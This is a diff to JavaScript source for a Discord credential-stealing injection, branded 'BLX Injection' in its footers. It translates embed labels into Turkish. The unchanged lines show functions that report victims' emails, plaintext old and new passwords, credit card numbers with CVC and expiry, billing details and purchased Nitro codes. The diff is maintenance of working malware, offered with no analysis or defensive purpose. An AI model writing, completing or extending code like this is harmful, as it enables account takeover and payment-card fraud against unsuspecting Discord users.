@@ -660,12 +660,12 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Information**',
+            name: '**Hesap Bilgileri**',
             value: `<:mail:1069997090266173500> Email: **${email}** - <:blacklock:1069101792736051221> Password: **${password}**`,
             inline: false,
           },
           {
-            name: '**Discord Information**',
+            name: '**Discord Bilgileri**',
             value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: false,
           },
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injectýon | BaþEdemezsiniz ',
+            text: 'BLX Injection | BasEdemezsiniz ',
             icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
@@ -703,12 +703,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
+            name: '**Şifre Değiştirildi**',
             value: `<:mail:1069997090266173500> Email: **${json.email}**\n<:blacklock:1069101792736051221> Old Password: **${oldpassword}**\n<:blacklock:1069101792736051221> New Password: **${newpassword}**`,
             inline: true,
           },
           {
-            name: '**Discord Information**',
+            name: '**Discord Bilgileri**',
             value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
@@ -723,7 +723,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injectýon | BaþEdemezsiniz',
+            text: 'BLX Injection | BasEdemezsiniz',
             icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
@@ -746,12 +746,12 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
+            name: '**Email Değiştirildi**',
             value: `<:mail:1069997090266173500> New Email: **${email}**\n<:blacklock:1069101792736051221> Password: **${password}**`,
             inline: true,
           },
           {
-            name: '**Discord Information**',
+            name: '**Discord Bilgileri**',
             value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
@@ -766,7 +766,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injectýon | BaþEdemezsiniz',
+            text: 'BLX Injection | BasEdemezsiniz',
             icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
@@ -789,12 +789,12 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Paypal Added**',
+            name: '**Paypal Eklendi**',
             value: `Time to buy some nitro baby ??`,
             inline: false,
           },
           {
-            name: '**Discord Information**',
+            name: '**Discord Bilgileri**',
             value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
@@ -809,7 +809,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injectýon | BaþEdemezsiniz',
+            text: 'BLX Injection | BasEdemezsiniz',
             icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
@@ -832,12 +832,12 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Credit Card Added**',
+            name: '**Kredi Kartı Eklendi**',
             value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
-            name: '**Discord Information**',
+            name: '**Discord Bilgileri**',
             value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
@@ -852,7 +852,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injectýon | BaþEdemezsiniz',
+            text: 'BLX Injection | BasEdemezsiniz',
             icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
@@ -877,12 +877,12 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Nitro bought!**',
+            name: '**Nitro Satın Alındı!**',
             value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
-            name: '**Discord Information**',
+            name: '**Discord Bilgileri**',
             value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
@@ -897,7 +897,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injectýon | BaþEdemezsiniz',
+            text: 'BLX Injection | BasEdemezsiniz',
             icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
